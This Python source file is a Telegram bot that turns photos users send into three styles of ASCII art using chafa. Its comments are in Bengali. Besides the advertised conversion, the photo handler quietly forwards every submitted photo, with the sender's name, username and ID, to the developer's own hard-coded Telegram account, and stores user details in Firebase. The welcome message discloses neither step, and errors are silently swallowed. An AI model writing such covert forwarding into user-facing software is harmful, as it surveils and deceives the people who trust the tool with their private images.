import os
import subprocess
import json
import firebase_admin
from firebase_admin import credentials, db
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

# গিটহাব সিক্রেটস থেকে টোকেন ও ফায়ারবেস ডেটা নেওয়া
TOKEN = os.getenv("BOT_TOKEN")
FIREBASE_URL = os.getenv("FIREBASE_URL")
FIREBASE_RAW = os.getenv("FIREBASE_JSON")

# তোর নিজের টেলিগ্রাম আইডি এখানে দে (যেন ইউজারদের ছবি তোর কাছে আসে)
MY_ID = 5652432858 

# ফায়ারবেস কানেকশন
firebase_connected = False
if FIREBASE_RAW and FIREBASE_URL:
    try:
        clean_url = FIREBASE_URL.strip().rstrip('/')
        FIREBASE_DICT = json.loads(FIREBASE_RAW)
        if not firebase_admin._apps:
            cred = credentials.Certificate(FIREBASE_DICT)
            firebase_admin.initialize_app(cred, {'databaseURL': clean_url})
            firebase_connected = True
    except Exception as e:
        print(f"Firebase Init Error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """কমান্ডের রিপ্লাই যেটা তুই চেয়েছিলি"""
    welcome_text = (
        "<b>Welcome to ASCII Maker!</b> 🎨\n\n"
        "I can convert your photos into 3 unique ASCII art styles.\n\n"
        "<b>How to use:</b>\n"
        "1. Send me any <b>Photo</b>.\n"
        "2. Wait a few seconds for processing.\n"
        "3. Get 3 different styles of ASCII text!\n\n"
        "<i>Note: For the best view on mobile, please use landscape mode or view on a desktop.</i>"
    )
    await update.message.reply_text(welcome_text, parse_mode='HTML')

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    
    # প্রসেসিং মেসেজ
    status_msg = await update.message.reply_text("Processing your image into 3 ASCII styles... 🎨")

    try:
        # ১. তোর সেভড মেসেজে ছবি পাঠানো (Admin Log)
        try:
            await context.bot.send_photo(
                chat_id=MY_ID, 
                photo=photo.file_id, 
                caption=f"📩 Photo from: {user.first_name} (@{user.username})\nID: {user.id}"
            )
        except: pass

        # ২. ফায়ারবেসে ডাটা রাখা
        if firebase_connected:
            try:
                db.reference(f'users/{user.id}').update({
                    "name": user.first_name, 
                    "username": user.username,
                    "last_active": str(update.message.date)
                })
            except: pass

        # ৩. আসকি আর্ট তৈরি (৩টি স্টাইল)
        photo_file = await photo.get_file()
        input_path = f"input_{user.id}.jpg"
        await photo_file.download_to_drive(input_path)

        styles = [
            {"label": "✨ Style 1: Braille Dots", "cmd": ["--symbols", "braille", "--size", "45x30"]},
            {"label": "🔳 Style 2: Blocks", "cmd": ["--symbols", "block", "--size", "40x25"]},
            {"label": "📜 Style 3: Classic ASCII", "cmd": ["--symbols", "ascii", "--size", "40x25"]}
        ]

        for style in styles:
            cmd = ["chafa"] + style["cmd"] + ["-c", "none", input_path]
            res = subprocess.run(cmd, capture_output=True, text=True).stdout
            
            if res:
                if len(res) > 3900: res = res[:3900]
                # <code> ট্যাগ দেওয়া হয়েছে যেন এক ক্লিকেই কপি হয়
                await update.message.reply_text(
                    f"<b>{style['label']}</b>\n<code>{res}</code>", 
                    parse_mode='HTML'
                )

        if os.path.exists(input_path): os.remove(input_path)

    except Exception as e:
        await update.message.reply_text(f"Sorry, an error occurred: <code>{e}</code>", parse_mode='HTML')
    
    finally:
        await status_msg.delete()

async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ভুল ইনপুট দিলে রিপ্লাই"""
    await update.message.reply_text(
        "⚠️ <b>Invalid Input!</b>\n\nPlease send a <b>Photo</b> to generate ASCII art.",
        parse_mode='HTML'
    )

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.ALL & (~filters.PHOTO) & (~filters.COMMAND), handle_invalid_input))

    print("Bot is running perfectly...")
    app.run_polling()
